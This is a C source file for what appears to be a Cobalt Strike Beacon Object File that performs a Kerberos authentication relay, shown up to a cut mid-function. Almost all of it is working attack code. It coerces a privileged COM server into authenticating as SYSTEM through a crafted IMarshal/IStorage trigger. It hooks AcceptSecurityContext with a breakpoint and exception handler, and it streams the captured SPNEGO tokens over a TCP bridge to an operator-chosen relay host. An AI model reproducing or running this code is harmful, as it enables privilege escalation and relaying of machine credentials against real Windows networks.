#define COBJMACROS
#define SECURITY_WIN32
#define _WIN32_WINNT 0x0601

/*
 * Kerberos-only COM authentication relay core.
 *
 * Execution model
 * ---------------
 * `go` parses one request, retains a legitimate caller-thread COM apartment
 * when it creates one, installs a short-lived vectored exception handler, and
 * starts one disposable STA worker. The worker initializes or queries COM
 * security, installs the SSPI breakpoint hook, advertises a task-owned RPC
 * resolver, and performs exactly one CoGetInstanceFromIStorage activation.
 *
 * The custom IMarshal output makes the selected privileged COM server resolve
 * an OBJREF back to this process. RPCSS calls native AcceptSecurityContext;
 * the temporary breakpoint redirects only those calls to accept_hook. Each
 * complete DCE/RPC authentication token crosses the KRB1 bridge to Python,
 * which adapts it to one persistent relay-target connection. The BOF never
 * implements the target protocol, parses or modifies Kerberos credential
 * material, creates an executable, or injects code into another process.
 *
 * Reuse and ownership
 * -------------------
 * Process-wide state is limited to legitimate COM initialization/security and
 * the RPC protocol-sequence listener. Any COM-retained principal data is on
 * the process heap; COM always retains a native, permanently mapped SSPI
 * address. The breakpoint, VEH, OBJREF, marshal entry, bridge socket, resolver
 * interface, and trigger backing storage are task-owned and removed in a
 * strict order before this COFF image can be unloaded. A later BOF task can
 * therefore install a new hook and force a fresh exchange in the same Beacon.
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <sspi.h>
#include <rpc.h>
#include <rpcdcep.h>
#include <objidl.h>
#include <objbase.h>
#include "beacon.h"

/* -------------------------------------------------------------------------
 * BOF imports
 *
 * A COFF object has no conventional Windows import table. Cobalt Strike
 * resolves each DLL$function symbol when `go` runs. Keeping only production
 * imports here makes the BOF's operating-system dependencies easy to audit.
 * ------------------------------------------------------------------------- */
#define BOF_IMPORT(dll, ret, call, name, args) DECLSPEC_IMPORT ret call dll##$##name args

BOF_IMPORT(KERNEL32, HANDLE, WINAPI, GetProcessHeap, (void));
BOF_IMPORT(KERNEL32, LPVOID, WINAPI, HeapAlloc, (HANDLE, DWORD, SIZE_T));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, HeapFree, (HANDLE, DWORD, LPVOID));
BOF_IMPORT(KERNEL32, HANDLE, WINAPI, GetCurrentProcess, (void));
BOF_IMPORT(KERNEL32, DWORD, WINAPI, GetLastError, (void));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, CloseHandle, (HANDLE));
BOF_IMPORT(KERNEL32, void, WINAPI, Sleep, (DWORD));
BOF_IMPORT(KERNEL32, HANDLE, WINAPI, CreateThread,
           (LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
            LPVOID, DWORD, LPDWORD));
BOF_IMPORT(KERNEL32, DWORD, WINAPI, WaitForSingleObject, (HANDLE, DWORD));
BOF_IMPORT(KERNEL32, DWORD, WINAPI, GetCurrentThreadId, (void));
BOF_IMPORT(KERNEL32, void, WINAPI, ExitThread, (DWORD));
BOF_IMPORT(KERNEL32, PVOID, WINAPI, AddVectoredExceptionHandler,
           (ULONG, PVECTORED_EXCEPTION_HANDLER));
BOF_IMPORT(KERNEL32, ULONG, WINAPI, RemoveVectoredExceptionHandler, (PVOID));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, FlushInstructionCache, (HANDLE, LPCVOID, SIZE_T));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, VirtualProtect, (LPVOID, SIZE_T, DWORD, PDWORD));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoInitializeEx, (LPVOID, DWORD));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoInitializeSecurity,
           (PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE *, void *,
            DWORD, DWORD, void *, DWORD, void *));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoQueryAuthenticationServices,
           (DWORD *, SOLE_AUTHENTICATION_SERVICE **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoReleaseMarshalData, (IStream *));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CreateILockBytesOnHGlobal, (HGLOBAL, BOOL, ILockBytes **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, StgCreateDocfileOnILockBytes,
           (ILockBytes *, DWORD, DWORD, IStorage **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CreateStreamOnHGlobal, (HGLOBAL, BOOL, IStream **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoMarshalInterface,
           (IStream *, REFIID, IUnknown *, DWORD, void *, DWORD));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoGetInstanceFromIStorage,
           (COSERVERINFO *, REFCLSID, IUnknown *, DWORD, IStorage *,
            DWORD, MULTI_QI *));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CLSIDFromString, (LPCOLESTR, LPCLSID));
BOF_IMPORT(OLE32, void, WINAPI, CoTaskMemFree, (LPVOID));
BOF_IMPORT(OLE32, LPVOID, WINAPI, CoTaskMemAlloc, (SIZE_T));
BOF_IMPORT(OLE32, void, WINAPI, CoUninitialize, (void));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerUseProtseqEpW,
           (RPC_WSTR, UINT, RPC_WSTR, void *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerRegisterAuthInfoW,
           (RPC_WSTR, ULONG, RPC_AUTH_KEY_RETRIEVAL_FN, void *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerRegisterIfEx,
           (RPC_IF_HANDLE, UUID *, RPC_MGR_EPV *, UINT, UINT,
            RPC_IF_CALLBACK_FN *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerUnregisterIf, (RPC_IF_HANDLE, UUID *, UINT));
BOF_IMPORT(NTDLL, LONG, NTAPI, NtQueryInformationProcess, (HANDLE, ULONG, PVOID, ULONG, PULONG));
BOF_IMPORT(SECUR32, PSecurityFunctionTableW, SEC_ENTRY, InitSecurityInterfaceW, (void));
BOF_IMPORT(WS2_32, int, WSAAPI, WSAStartup, (WORD, LPWSADATA));
BOF_IMPORT(WS2_32, int, WSAAPI, WSACleanup, (void));
BOF_IMPORT(WS2_32, SOCKET, WSAAPI, socket, (int, int, int));
BOF_IMPORT(WS2_32, int, WSAAPI, getaddrinfo,
           (PCSTR, PCSTR, const struct addrinfo *, struct addrinfo **));
BOF_IMPORT(WS2_32, void, WSAAPI, freeaddrinfo, (struct addrinfo *));
BOF_IMPORT(WS2_32, int, WSAAPI, connect, (SOCKET, const struct sockaddr *, int));
BOF_IMPORT(WS2_32, int, WSAAPI, send, (SOCKET, const char *, int, int));
BOF_IMPORT(WS2_32, int, WSAAPI, recv, (SOCKET, char *, int, int));
BOF_IMPORT(WS2_32, int, WSAAPI, closesocket, (SOCKET));

/* -------------------------------------------------------------------------
 * Wire protocol and state
 * ------------------------------------------------------------------------- */
/* KRB1 v3 carries relay tokens. Authentication ends at AUTH_OK; any
 * post-authentication operation and result belong to the Python adapter. */
#define BRIDGE_CLIENT_TOKEN 3
#define BRIDGE_SERVER_TOKEN 4
#define BRIDGE_AUTH_OK      5
#define BRIDGE_ERROR        6
#define BRIDGE_VERSION      3
#define MAX_TOKEN           65535u
#define MAX_ERROR           512u

/* Numeric values are stable because operators use them to diagnose failures
 * reported after the worker exits. */
typedef enum {
    STAGE_ARGUMENT_BLOCK = 1,
    STAGE_RELAY_HOST = 2,
    STAGE_RELAY_PORT = 3,
    STAGE_SERVICE_SPN = 4,
    STAGE_RPC_HOST = 5,
    STAGE_RPC_ENDPOINT = 6,
    STAGE_TRIGGER_CLSID = 7,
    STAGE_VEH_INSTALL = 8,
    STAGE_WORKER_START = 9,
    STAGE_WORKER_COM = 10,
    STAGE_CLSID_PARSE = 11,
    STAGE_CALLER_COM = 12,
    STAGE_SSPI_HOOK = 20,
    STAGE_COM_QUERY = 25,
    STAGE_COM_POLICY = 26,
    STAGE_COM_SECURITY = 30,
    STAGE_COM_AUTH_PACKAGE = 31,
    STAGE_NATIVE_ANCHOR = 39,
    STAGE_OBJREF_PREPARE = 40,
    STAGE_RPC_RESOLVER = 50,
    STAGE_STORAGE = 60,
    STAGE_OBJREF_BINDING = 65,
    STAGE_OBJREF_SECURITY = 66,
    STAGE_ACTIVATION = 70,
    STAGE_RELAY_BRIDGE = 71,
    STAGE_RELAY_CONTINUATION = 72,
    STAGE_RELAY_TARGET = 73,
    STAGE_RELAY_COMPLETE = 80,
    STAGE_CLEANUP = 90,
    STAGE_WORKER_EXCEPTION = 94,
    STAGE_MARSHAL_STREAM = 621,
    STAGE_MARSHAL_INTERFACE = 622,
    STAGE_MARSHAL_READ = 623
} RELAY_STAGE;

typedef enum {
    TRACE_STORAGE_QI = 1,
    TRACE_MARSHAL_QI = 2,
    TRACE_MARSHAL_CLASS = 4,
    TRACE_MARSHAL_WRITE = 8,
    TRACE_STORAGE_STAT = 16,
    TRACE_RELAY_CONTINUATION = 32,
    TRACE_CONTINUATION_INJECTED = 64
} RELAY_TRACE;

typedef struct _TRIGGER TRIGGER;

/* Custom storage object handed to CoGetInstanceFromIStorage. Its IMarshal
 * implementation returns the crafted resolver OBJREF; every other IStorage
 * operation delegates to the native temporary backing storage. */
struct _TRIGGER {
    const IStorageVtbl *storageVtbl;
    const IMarshalVtbl *marshalVtbl;
    LONG refs;
    IStorage *backing;
    BYTE *objref;
    ULONG objref_len;
};

/* One invocation performs exactly one activation, so a single state object is
 * sufficient. The comments below group fields by ownership and lifetime.
 * Nothing in g_state may be referenced after `go` returns. */
typedef struct {
    /* Nonzero static sentinel keeps the large zero-filled object in .data.
     * go() resets it before every execution; the field has no runtime role. */
    LONG initialized;

    /* Operator-supplied configuration, parsed once by go(). */
    char relay_host[256];
    int relay_port;
    WCHAR service_spn[256];
    WCHAR rpc_host[256];
    WCHAR rpc_endpoint[32];
    WCHAR trigger_clsid[64];

    /* Lifecycle and diagnostics. */
    int wsa_ready;
    int com_ready;
    DWORD com_thread_id;
    DWORD protected_thread_id;
    int callback_count;
    int relayed_leg_count;
    int success;
    int stage;
    int detail;
    int trace;
    int bridge_failed;
    int rewrite_security_binding;
    int com_security_immutable;

    /* One persistent socket carries every SPNEGO leg to the Python relay. */
    SOCKET bridge;
    BYTE *continuation;
    ULONG continuation_len;

    /* Temporary resident-code breakpoint and SSPI callback activity. */
    ACCEPT_SECURITY_CONTEXT_FN original_accept;
    BYTE accept_saved_byte;
    int breakpoint_installed;
    LONG active_callbacks;

    /* The RPC protocol listener is process-wide; its interface is task-owned. */
    int resolver_registered;
    RPC_IF_HANDLE registered_interface;
    RPC_DISPATCH_TABLE *registered_dispatch;

    /* First fatal exception observed on the protected BOF worker thread. */
    volatile LONG exception_caught;
    DWORD exception_code;
    DWORD exception_flags;
    ULONG_PTR exception_address;
    ULONG_PTR exception_parameter0;
    ULONG_PTR exception_parameter1;
    DWORD exception_parameter_count;
    DWORD exception_thread_id;

    /* Task-owned COM objects and explicit marshal packet. */
    TRIGGER trigger;
    IStream *anchor_stream;
} RELAY_STATE;

typedef struct {
    void *Reserved1;
    void *PebBaseAddress;
    void *Reserved2[2];
    ULONG_PTR ProcessId;
    void *Reserved3;
} KPROCESS_BASIC_INFORMATION;

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} KUNICODE_STRING;

static RELAY_STATE g_state = {.initialized = 1};
static const GUID KIID_IUnknown = {
    0x00000000, 0, 0, {0xc0, 0, 0, 0, 0, 0, 0, 0x46}
};
static const GUID KIID_IMarshal = {
    0x00000003, 0, 0, {0xc0, 0, 0, 0, 0, 0, 0, 0x46}
};
static const GUID KIID_IStorage = {
    0x0000000b, 0, 0, {0xc0, 0, 0, 0, 0, 0, 0, 0x46}
};

/* -------------------------------------------------------------------------
 * Allocation, byte-order, and argument helpers
 * ------------------------------------------------------------------------- */
static int kmemeq(const void *a_, const void *b_, ULONG n) {
    const BYTE *a = (const BYTE *)a_, *b = (const BYTE *)b_;
    ULONG i;

    for (i = 0; i < n; ++i) {
        /* One differing byte is enough to reject an interface identifier. */
        if (a[i] != b[i]) {
            return 0;
        }
    }
    return 1;
}

/* These small helpers avoid importing a C runtime solely for memory access. */
static void kcopy(void *d_, const void *s_, ULONG n) {
    BYTE *destination = (BYTE *)d_;
    const BYTE *source = (const BYTE *)s_;
    ULONG i;

    for (i = 0; i < n; ++i) {
        destination[i] = source[i];
    }
}

static void kzero(void *d_, ULONG n) {
    BYTE *destination = (BYTE *)d_;
    ULONG i;

    for (i = 0; i < n; ++i) {
        destination[i] = 0;
    }
}

static LONG atomic_add(volatile LONG *value, LONG delta) {
    return __sync_add_and_fetch(value, delta);
}

static LONG atomic_read(volatile LONG *value) {
    return __sync_val_compare_and_swap(value, 0, 0);
}

static SECURITY_STATUS SEC_ENTRY accept_hook(
    PCredHandle, PCtxtHandle, PSecBufferDesc, ULONG, ULONG, PCtxtHandle,
    PSecBufferDesc, PULONG, PTimeStamp);

/* The VEH has two deliberately narrow jobs:
 *
 * 1. Redirect the intentional breakpoint at native AcceptSecurityContext to
 *    this BOF's accept_hook, regardless of which RPC thread reached it.
 * 2. Contain an otherwise-unhandled fault raised on the dedicated activation
 *    worker. It does not consume unrelated Beacon/RPC-thread exceptions.
 *
 * go() removes the handler before Cobalt Strike can unload this COFF image. */
static LONG CALLBACK relay_exception_handler(EXCEPTION_POINTERS *exception_info) {
    EXCEPTION_RECORD *record;
    DWORD thread_id = KERNEL32$GetCurrentThreadId();

    /* Missing exception metadata cannot be safely classified as our event. */
    if (!exception_info || !exception_info->ExceptionRecord) {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    record = exception_info->ExceptionRecord;

    /* Handle only the deliberate INT3 published by install_hook(). */
    if (g_state.breakpoint_installed &&
        record->ExceptionCode == EXCEPTION_BREAKPOINT &&
        record->ExceptionAddress == (PVOID)g_state.original_accept) {
        exception_info->ContextRecord->Rip = (DWORD64)(ULONG_PTR)accept_hook;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* An unrelated exception on any other process thread belongs to its
     * normal Windows handler chain, not to this BOF. */
    if (thread_id != g_state.protected_thread_id) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    /* Multiple handlers may observe a fault; publish only the first record. */
    if (__sync_bool_compare_and_swap(&g_state.exception_caught, 0, 1)) {
        g_state.exception_code = record->ExceptionCode;
        g_state.exception_flags = record->ExceptionFlags;
        g_state.exception_address = (ULONG_PTR)record->ExceptionAddress;
        g_state.exception_parameter_count = record->NumberParameters;
        /* Windows supplies zero or more exception-specific parameters. */
        if (g_state.exception_parameter_count) {
            g_state.exception_parameter0 = record->ExceptionInformation[0];
        }
        if (g_state.exception_parameter_count > 1) {
            g_state.exception_parameter1 = record->ExceptionInformation[1];
        }
        g_state.exception_thread_id = thread_id;
    }

    KERNEL32$ExitThread(record->ExceptionCode);
    return EXCEPTION_CONTINUE_SEARCH;
}
static int ascii_to_wide(const char *source, int source_len, WCHAR *target, ULONG target_count) {
    int i;
    int chars = source_len > 0 && source[source_len - 1] == 0
                    ? source_len - 1
                    : source_len;

    /* BOF string fields include a terminator. Require one nonempty value that
     * fits the fixed destination, reserving space for our own NUL. */
    if (!source || chars < 1 || (ULONG)chars >= target_count) {
        return 0;
    }

    for (i = 0; i < chars; ++i) {
        /* ASCII-only input keeps SPN/endpoint output reversible and prevents
         * ambiguous Unicode values from reaching COM or RPC. */
        if ((BYTE)source[i] > 0x7f) {
            return 0;
        }
        target[i] = (WCHAR)(BYTE)source[i];
    }
    target[chars] = 0;
    return 1;
}

/* Runtime endpoint strings entered through the CNA were restricted to ASCII,
 * so conversion back for operator output cannot be lossy. */
static int wide_to_ascii(const WCHAR *source, char *target, ULONG target_count) {
    ULONG i = 0;
    /* Reject invalid buffers rather than producing partial status output. */
    if (!source || !target || !target_count) {
        return 0;
    }
    while (source[i]) {
        /* All runtime values originated in ascii_to_wide(), but keep this
         * helper independently bounded in case call sites change later. */
        if (i + 1 >= target_count || source[i] > 0x7f) {
            return 0;
        }
        target[i] = (char)source[i];
        i++;
    }
    target[i] = 0;
    return 1;
}
static void decimal_port(int value, char out[6]) {
    int i = 5;

    out[i] = 0;
    do {
        out[--i] = (char)('0' + value % 10);
        value /= 10;
    } while (value && i);

    /* Move the generated suffix to index zero for getaddrinfo(). */
    if (i) {
        int j = 0;
        while (i <= 5) {
            out[j++] = out[i++];
        }
    }
}
static WORD rd16(const BYTE *p) {
    return (WORD)(p[0] | ((WORD)p[1] << 8));
}
static void wr16(BYTE *p, WORD x) {
    p[0] = (BYTE)x;
    p[1] = (BYTE)(x >> 8);
}
static ULONG rd32be(const BYTE *p) {
    return ((ULONG)p[0] << 24) | ((ULONG)p[1] << 16) |
           ((ULONG)p[2] << 8) | p[3];
}
static void wr32be(BYTE *p, ULONG x) {
    p[0] = (BYTE)(x >> 24);
    p[1] = (BYTE)(x >> 16);
    p[2] = (BYTE)(x >> 8);
    p[3] = (BYTE)x;
}
static void *alloc(SIZE_T n) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, n);
}
static void release(void *p) {
    if (p) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p);
    }
}
/* RPCSS authenticates to IObjectExporter before dispatch. An empty task-owned
 * dispatch table is therefore enough; COM activation is the meaningful work. */
static RPC_SERVER_INTERFACE resolver_interface={1};
static const RPC_SYNTAX_IDENTIFIER resolver_syntax = {
    {0x99fcfec4, 0x5260, 0x101b,
     {0xbb, 0xcb, 0x00, 0x00, 0x00, 0x21, 0x34, 0x7a}},
    {0, 0}
};
static const RPC_SYNTAX_IDENTIFIER ndr_syntax = {
    {0x8a885d04, 0x1ceb, 0x11c9,
     {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}},
    {2, 0}
};

/* -------------------------------------------------------------------------
 * KRB1 bridge transport
 *
 * Complete RPC authentication tokens travel over one TCP connection. Python
 * holds the matching target connection open across all SPNEGO legs.
 * ------------------------------------------------------------------------- */
/* TCP is a byte stream: bridge framing must tolerate short sends/receives. */
static int send_all(SOCKET s, const BYTE *data, ULONG length) {
    ULONG used = 0;
    int n;

    while (used < length) {
        n = WS2_32$send(s, (const char *)data + used, (int)(length - used), 0);
        /* A zero/negative result means the bridge closed or rejected the TCP stream. */
        if (n <= 0) {
            return 0;
        }
        used += (ULONG)n;
    }
    return 1;
}

static int recv_all(SOCKET s, BYTE *data, ULONG length) {
    ULONG used = 0;
    int n;

    while (used < length) {
        n = WS2_32$recv(s, (char *)data + used, (int)(length - used), 0);
        /* Treat either orderly closure or a socket error as an incomplete record. */
        if (n <= 0) {
            return 0;
        }
        used += (ULONG)n;
    }
    return 1;
}

static int send_record(BYTE kind, const BYTE *data, ULONG length);
static int recv_record(BYTE *kind, BYTE **data, ULONG *length);
static void report_bridge_error(BYTE *data, ULONG length);

/* Connect lazily at the first callback and reuse one bridge socket so Python
   can keep the same target connection throughout mutual authentication. */
static int bridge_connect(void) {
    WSADATA wd;
    struct addrinfo hints, *addresses = NULL, *current;
    char service[6];

    /* A live socket preserves the remote service's SPNEGO state between legs. */
    if (g_state.bridge != INVALID_SOCKET) {
        return 1;
    }

    /* Winsock must be initialized once before any resolver/socket operation. */
    if (!g_state.wsa_ready) {
        if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wd)) {
            return 0;
        }
        g_state.wsa_ready = 1;
    }
    decimal_port(g_state.relay_port, service);
    kzero(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    /* The loop below needs at least one resolved IPv4 relay address. */
    if (WS2_32$getaddrinfo(g_state.relay_host, service, &hints, &addresses) ||
        !addresses) {
        return 0;
    }

    for (current = addresses; current; current = current->ai_next) {
        g_state.bridge = WS2_32$socket(current->ai_family,
                                      current->ai_socktype,
                                      current->ai_protocol);
        /* Stop at the first address accepting a complete TCP connection. */
        if (g_state.bridge != INVALID_SOCKET &&
            WS2_32$connect(g_state.bridge, current->ai_addr,
                           (int)current->ai_addrlen) == 0) {
            break;
        }
        if (g_state.bridge != INVALID_SOCKET) {
            WS2_32$closesocket(g_state.bridge);
        }
        g_state.bridge = INVALID_SOCKET;
    }
    WS2_32$freeaddrinfo(addresses);
    /* Activation cannot continue when no relay address is reachable. */
    if (g_state.bridge == INVALID_SOCKET) {
        return 0;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] Relay bridge connected via %s:%d\n",
                 g_state.relay_host, g_state.relay_port);
    return 1;
}

static ULONG record_limit(BYTE kind) {
    switch (kind) {
        /* AUTH_OK is a terminal state marker and intentionally has no body. */
        case BRIDGE_AUTH_OK:
            return 0;
        /* Authentication payloads share the SSPI/RPC token ceiling. */
        case BRIDGE_CLIENT_TOKEN:
        case BRIDGE_SERVER_TOKEN:
            return MAX_TOKEN;
        /* Error text has a much smaller diagnostic-only allowance. */
        case BRIDGE_ERROR:
            return MAX_ERROR;
        default:
            return (ULONG)-1;
    }
}

static ULONG record_minimum(BYTE kind) {
    /* Token records must carry bytes; terminal/error records may be empty. */
    if (kind == BRIDGE_CLIENT_TOKEN || kind == BRIDGE_SERVER_TOKEN) {
        return 1;
    }
    return 0;
}

/* KRB1 uses network byte order, unlike the little-endian BOF argument block. */
static int send_record(BYTE kind, const BYTE *data, ULONG length) {
    BYTE h[12] = {'K','R','B','1',BRIDGE_VERSION,0,0,0,0,0,0,0};
    ULONG limit = record_limit(kind);
    ULONG minimum = record_minimum(kind);

    /* Per-kind bounds reject unknown types, truncated tokens, and oversize data. */
    if (limit == (ULONG)-1 || length < minimum || length > limit) {
        return 0;
    }
    h[5] = kind;
    wr32be(h + 8, length);
    if (!send_all(g_state.bridge, h, sizeof(h))) {
        return 0;
    }
    /* Empty terminal records have no second write. */
    if (!length) {
        return 1;
    }
    return send_all(g_state.bridge, data, length);
}

static int recv_record(BYTE *kind, BYTE **data, ULONG *length) {
    BYTE h[12];
    ULONG n, limit, minimum;

    *data = NULL;
    *length = 0;
    /* The fixed header must be complete before any field is inspected. */
    if (!recv_all(g_state.bridge, h, sizeof(h))) {
        return 0;
    }
    /* Validate magic, version, and reserved bytes before trusting kind/length. */
    if (h[0] != 'K' || h[1] != 'R' || h[2] != 'B' || h[3] != '1' ||
        h[4] != BRIDGE_VERSION || h[6] || h[7]) {
        return 0;
    }
    *kind = h[5];
    n = rd32be(h + 8);
    limit = record_limit(*kind);
    minimum = record_minimum(*kind);
    /* Apply the same message-specific limits on receive as on send. */
    if (limit == (ULONG)-1 || n < minimum || n > limit) {
        return 0;
    }
    if (n) {
        *data = (BYTE *)alloc((SIZE_T)n + 1);
        if (!*data || !recv_all(g_state.bridge, *data, n)) {
            release(*data);
            *data = NULL;
            return 0;
        }
    }
    *length = n;
    return 1;
}

/* Relay errors contain non-secret text only. Clamp and sanitize before Beacon. */
static void report_bridge_error(BYTE *data, ULONG length) {
    ULONG i;
    g_state.bridge_failed = 1;
    if (!data || !length) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Relay server returned an unspecified error\n");
        return;
    }
    /* Clamp defense-in-depth even though recv_record already validates length. */
    if (length > MAX_ERROR) {
        length = MAX_ERROR;
    }
    for (i = 0; i < length; i++) {
        /* Do not allow remote text to inject Beacon control characters. */
        if (data[i] < 0x20 || data[i] > 0x7e) {
            data[i] = ' ';
        }
    }
    data[length] = 0;
    BeaconPrintf(CALLBACK_ERROR, "[-] Relay server: %s\n", (char *)data);
}

static int recv_auth_reply(BYTE *kind, BYTE **data, ULONG *length) {
    if (!recv_record(kind, data, length)) {
        return 0;
    }
    /* Only a challenge, success marker, or explicit failure is valid here. */
    if (*kind == BRIDGE_SERVER_TOKEN ||
        *kind == BRIDGE_AUTH_OK ||
        *kind == BRIDGE_ERROR) {
        return 1;
    }

    release(*data);
    *data = NULL;
    *length = 0;
    g_state.bridge_failed = 1;
    BeaconPrintf(CALLBACK_ERROR,
                 "[-] Relay server returned an out-of-state message\n");
    return 0;
}

/* -------------------------------------------------------------------------
 * COM trigger facade
 *
 * IStorage calls use a real in-memory compound file. QueryInterface also
 * exposes a custom IMarshal whose MarshalInterface writes the rewritten
 * OBJREF. The privileged out-of-process COM server unmarshals that OBJREF and
 * authenticates to the advertised resolver endpoint as SYSTEM.
 * ------------------------------------------------------------------------- */
static TRIGGER *trigger_from(void *This) {
    /* The interface identity is the address of either leading vtable field,
     * not the containing TRIGGER address. Both map to one loader-owned object. */
    if (This == &g_state.trigger.storageVtbl ||
        This == &g_state.trigger.marshalVtbl) {
        return &g_state.trigger;
    }
    return NULL;
}

static HRESULT STDMETHODCALLTYPE trigger_qi(IStorage *This, REFIID riid, void **ppv) {
    TRIGGER *t = trigger_from(This);
    g_state.trace |= TRACE_STORAGE_QI;
    /* COM requires a writable output slot even for unsupported interfaces. */
    if (!ppv) {
        return E_POINTER;
    }
    *ppv = NULL;
    if (!t) {
        return E_NOINTERFACE;
    }
    if (kmemeq(riid, &KIID_IUnknown, sizeof(GUID)) ||
        kmemeq(riid, &KIID_IStorage, sizeof(GUID))) {
        *ppv = &t->storageVtbl;
    } else if (kmemeq(riid, &KIID_IMarshal, sizeof(GUID))) {
        g_state.trace |= TRACE_MARSHAL_QI;
        *ppv = &t->marshalVtbl;
    } else {
        /* Reject all interfaces not explicitly implemented by this facade. */
        return E_NOINTERFACE;
    }
    ++t->refs;
    return S_OK;
}
static ULONG STDMETHODCALLTYPE trigger_add(IStorage *This) {
    TRIGGER *t = trigger_from(This);
    /* Invalid interface identity cannot contribute a legitimate COM reference. */
    if (!t) {
        return 0;
    }
    return (ULONG)++t->refs;
}
static ULONG STDMETHODCALLTYPE trigger_release(IStorage *This) {
    TRIGGER *t = trigger_from(This);
    if (!t) {
        return 0;
    }
    /* The trigger lives in g_state, which the BOF loader owns. Pin the last
     * reference instead of letting COM attempt to free loader memory. */
    if (t->refs > 1) {
        --t->refs;
    }
    return (ULONG)t->refs;
}
static IStorage *trigger_backing(IStorage *storage) {
    return trigger_from(storage)->backing;
}

/* The activation path expects a usable IStorage facade. Structural storage
 * operations delegate to the real in-memory compound file, while metadata
 * setters below deliberately accept values without changing the backing
 * object. The standard marshaler only relies on Stat and IMarshal here. */
static HRESULT STDMETHODCALLTYPE tr_CreateStream(
    IStorage *storage, LPCOLESTR name, DWORD mode, DWORD reserved1,
    DWORD reserved2, IStream **stream) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->CreateStream(
        backing, name, mode, reserved1, reserved2, stream);
}

static HRESULT STDMETHODCALLTYPE tr_OpenStream(
    IStorage *storage, LPCOLESTR name, void *reserved1, DWORD mode,
    DWORD reserved2, IStream **stream) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->OpenStream(
        backing, name, reserved1, mode, reserved2, stream);
}

static HRESULT STDMETHODCALLTYPE tr_CreateStorage(
    IStorage *storage, LPCOLESTR name, DWORD mode, DWORD reserved1,
    DWORD reserved2, IStorage **child) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->CreateStorage(
        backing, name, mode, reserved1, reserved2, child);
}

static HRESULT STDMETHODCALLTYPE tr_OpenStorage(
    IStorage *storage, LPCOLESTR name, IStorage *priority, DWORD mode,
    SNB excluded_names, DWORD reserved, IStorage **child) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->OpenStorage(
        backing, name, priority, mode, excluded_names, reserved, child);
}

static HRESULT STDMETHODCALLTYPE tr_CopyTo(
    IStorage *storage, DWORD excluded_count, const IID *excluded_iids,
    SNB excluded_names, IStorage *destination) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->CopyTo(
        backing, excluded_count, excluded_iids, excluded_names, destination);
}

static HRESULT STDMETHODCALLTYPE tr_MoveElementTo(
    IStorage *storage, LPCOLESTR name, IStorage *destination,
    LPCOLESTR new_name, DWORD flags) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->MoveElementTo(
        backing, name, destination, new_name, flags);
}

static HRESULT STDMETHODCALLTYPE tr_Commit(IStorage *storage, DWORD flags) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->Commit(backing, flags);
}

static HRESULT STDMETHODCALLTYPE tr_Revert(IStorage *storage) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->Revert(backing);
}

static HRESULT STDMETHODCALLTYPE tr_EnumElements(
    IStorage *storage, DWORD reserved1, void *reserved2, DWORD reserved3,
    IEnumSTATSTG **enumerator) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->EnumElements(
        backing, reserved1, reserved2, reserved3, enumerator);
}

static HRESULT STDMETHODCALLTYPE tr_Stat(
    IStorage *storage, STATSTG *status, DWORD flags) {
    const WCHAR name[] = L"hello.stg";
    IStorage *backing = trigger_backing(storage);
    HRESULT hr;

    g_state.trace |= TRACE_STORAGE_STAT;
    hr = backing->lpVtbl->Stat(backing, status, flags);

    /* Replace the optional COM-allocated name so the activation sees the
     * stable compound-file identity expected by this trigger path. */
    if (SUCCEEDED(hr) && status) {
        if (status->pwcsName) {
            OLE32$CoTaskMemFree(status->pwcsName);
        }
        status->pwcsName = (LPOLESTR)OLE32$CoTaskMemAlloc(sizeof(name));
        /* Name allocation failure is nonfatal: the backing Stat still succeeded. */
        if (status->pwcsName) {
            kcopy(status->pwcsName, name, sizeof(name));
        }
    }
    return hr;
}

static HRESULT STDMETHODCALLTYPE tr_DestroyElement(
    IStorage *storage, LPCOLESTR name) {
    IStorage *backing = trigger_backing(storage);
    return backing->lpVtbl->DestroyElement(backing, name);
}

static HRESULT STDMETHODCALLTYPE tr_RenameElement(
